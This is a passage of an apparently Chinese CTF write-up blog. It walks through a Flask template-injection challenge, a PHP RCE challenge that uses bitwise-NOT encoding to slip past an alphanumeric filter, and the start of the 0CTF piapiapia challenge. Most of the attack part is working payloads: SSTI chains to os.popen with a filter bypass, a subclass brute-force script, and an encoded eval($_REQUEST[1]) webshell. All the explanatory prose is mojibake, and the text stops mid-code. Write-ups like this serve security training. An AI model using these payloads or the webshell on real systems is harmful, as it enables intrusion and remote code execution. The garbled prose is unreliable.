GET --&gt;</span><br></code></pre></td></tr></table></figure><p><code>/?search=&#123;&#123;7*7&#125;&#125;</code>å›æ˜¾<code>49</code>ï¼Œå­˜åœ¨<code>SSTI</code></p><p><code>?search=&#123;&#123;''.__class__.__base__.__base__.__subclasses__()&#125;&#125;</code>:</p><p><img src="/img/flasklight2.png" alt="flasklight2"></p><p>å¯ä»¥çœ‹åˆ°ç›®å‰æˆ‘ä»¬æ²¡ç¢°åˆ°ä»»ä½•è¿‡æ»¤ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å»æ‰§è¡Œå‘½ä»¤ï¼š</p><p><code>payload1</code>:(éœ€è¦è„šæœ¬å»æ‰¾å¯ä»¥è°ƒç”¨<code>os</code>æ¨¡å—çš„ç±»)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://9311a17d-d080-40a8-a7f2-83bda4f35d3f.node4.buuoj.cn:81/?search=%7B%7B&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]%7D%7D&quot;</span>  <span class="hljs-comment"># æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥åŠ i</span><br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Print&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#æ³¨æ„urlé‚£é‡Œä¸€å®šè¦åŒå¼•å·åŒ…è£¹ã€‚ã€‚</span><br><br><span class="hljs-comment"># 71</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨<code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code>å»è®¿é—®è¿™ä¸ªæ¨¡å—å¹¶æ‰§è¡Œå‡½æ•°ï¼š</p><p><img src="/img/flasklight3.png" alt="flasklight3"></p><p>å‡ºç°äº†<code>500</code>ï¼Œ<code>__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code>è¿™éƒ¨åˆ†åº”è¯¥è§¦å‘äº†è¿‡æ»¤ï¼Œæˆ‘ä»¬æŒ‰é¡ºåºè¯•è¯•å…³é”®å­—å‘ç°<code>globals</code>è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼š</p><p><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()&#125;&#125;</code></p><p><img src="/img/flasklight4.png" alt="flasklight4"></p><p>ç„¶åæ”¹å˜å‘½ä»¤å»æ‰¾æ–‡ä»¶å°±è¡Œ</p><p><code>flag&#123;7395b568-25c5-47b8-914a-7338fc453ec2&#125;</code></p><p><code>payload2</code>:</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> b <span class="hljs-keyword">in</span> c.__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>].values() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> b.__class__ == &#123;&#125;.__class__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åçœ‹ä¸‹<code>popen</code>å’Œ<code>open</code>çš„åŒºåˆ«ï¼š</p><p><img src="/img/flasklight6.png" alt="flasklight6"></p><p>å¦‚æœæˆ‘ä»¬è¦å»è¯»æŸä¸ªå·²çŸ¥çš„æ–‡ä»¶ï¼Œå¯ä»¥é€‰æ‹©ç”¨<code>open</code>ï¼Œå®ƒä¸è¦æ±‚æˆ‘ä»¬å»å¯»æ‰¾æŸä¸ªè°ƒç”¨<code>os</code>æ¨¡å—çš„ç±»ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œè¿˜æ˜¯è¦ç”¨<code>popen</code>ã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å¾ˆå¥½ç†è§£ï¼Œä¸è¿‡å®ƒä¸å…‰é™åˆ¶äº†<code>code</code>çš„é•¿åº¦ï¼Œè€Œä¸”æ­£åˆ™åŒ¹é…äº†æ‰€æœ‰å¤§å°å†™å­—æ¯åŠ æ•°å­—ï¼Ÿè¦æ€ä¹ˆæ„å»º<code>payload</code>ï¼Ÿ</p><p>ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹<code>RCEè¿‡æ»¤å­—æ¯å’Œæ•°å­—</code>ï¼š<code>https://xz.aliyun.com/t/11929</code></p><p>ä¸»è¦æœ‰å¼‚æˆ–ã€è‡ªå¢ã€å–åä¸‰ç§æ–¹æ³•ã€‚å–åå¥½ç†è§£è€Œä¸”æ¯”è¾ƒçŸ­ï¼Œå°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ans1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<span class="hljs-comment">//å‡½æ•°å</span><br><span class="hljs-variable">$ans2</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;<span class="hljs-comment">//å‘½ä»¤</span><br><span class="hljs-variable">$data1</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans1</span>));<span class="hljs-comment">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°system</span><br><span class="hljs-variable">$data2</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans2</span>));<span class="hljs-comment">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°dir</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data1</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data2</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ç»“æœä¼ ç»™<code>code</code>æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œä¼°è®¡è§¦å‘äº†ä»€ä¹ˆå…³é”®å­—ï¼Œå°è¯•ç”¨ä¸€å¥è¯æœ¨é©¬è¿æ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;eval($_REQUEST[1]);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//https://www.cnblogs.com/Article-kelp/p/14704975.html</span><br>    <br></code></pre></td></tr></table></figure><p><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</code></p><p><code>POST</code>ä¼ <code>1=phpinfo();</code>(<code>PHP Version 7.0.33</code>)ï¼Œåœ¨<code>disable_functions</code>ä¸­å‘ç°ç¦ç”¨äº†å¤§é‡å‡½æ•°ï¼š</p><p><img src="/img/qvfan1.png" alt="qvfan1"></p><p>åé¢æœ‰ä¸¤ç§è§£æ³•ï¼š</p><p>1.å°±æ˜¯åˆ©ç”¨èšå‰‘ä¸­è¿™ä¸ªæ’ä»¶(æ³¨æ„è¦åœ¨<code>Linux</code>ä¸‹ä½¿ç”¨ï¼Œå®‰è£…å¯ä»¥å‚è€ƒ<code>[Bypass - èšå‰‘èœåˆ€è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œå‘½ä»¤è¿”å›ret=127 | CN-SEC ä¸­æ–‡ç½‘](https://cn-sec.com/archives/1878964.html)</code>)ï¼š</p><p><img src="/img/rceme6.png" alt="rceme6"></p><p><img src="/img/rceme7.png" alt="rceme7"></p><p><img src="/img/rceme5.png" alt="rceme5"></p><p><code>flag&#123;3a24f812-7171-4308-a702-d7a77fd2c2cd&#125;</code></p><p><strong>evalå‡½æ•°ä¸­å‚æ•°æ˜¯å­—ç¬¦</strong>ï¼Œ<strong>assertå‡½æ•°ä¸­å‚æ•°ä¸ºè¡¨è¾¾å¼ ï¼ˆæˆ–è€…ä¸ºå‡½æ•°</strong></p><p><code>https://www.cnblogs.com/NoCirc1e/p/16275602.html</code></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼Œä¸€å¼€å§‹ä»¥ä¸ºsqlæ³¨å…¥ï¼Œä½†å°è¯•åå‘ç°ä¸å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><p><code>www.zip</code>æ³„éœ²(è¿˜æŒºå¤šçš„)ï¼š</p><p><img src="/img/pia1.png" alt="pia1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <span class="hljs-comment">//é™åˆ¶äº†ç”¨æˆ·åå’Œå¯†ç çš„é•¿åº¦</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-title function_ invoke__">mysql_connect</span>(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_fetch_object</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span 